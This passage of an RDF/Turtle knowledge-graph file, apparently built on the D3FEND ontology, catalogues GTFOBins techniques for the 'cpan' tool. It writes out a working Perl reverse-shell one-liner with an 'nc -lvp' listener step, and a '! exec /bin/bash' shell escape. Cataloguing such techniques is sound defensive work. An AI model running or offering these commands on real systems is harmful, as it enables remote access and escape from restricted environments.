! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();
""" .

mknd:command_cpan-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "cpan-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc -lvp RPORT` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_cpan ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_cpan ;
    mknd:provides mknd:function_reverse-shell ;
    mknd:value """export RHOST=localhost
export RPORT=9000
cpan
! use Socket; my $i="$ENV{RHOST}"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};
""" .

mknd:command_cpan-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "cpan-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """`cpan` lets you execute perl commands with the `! command`.
""" ;
    d3f:uses mknd:executable_cpan ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_cpan ;
    mknd:provides mknd:function_shell ;
    mknd:value """cpan
! exec '/bin/bash'
""" .

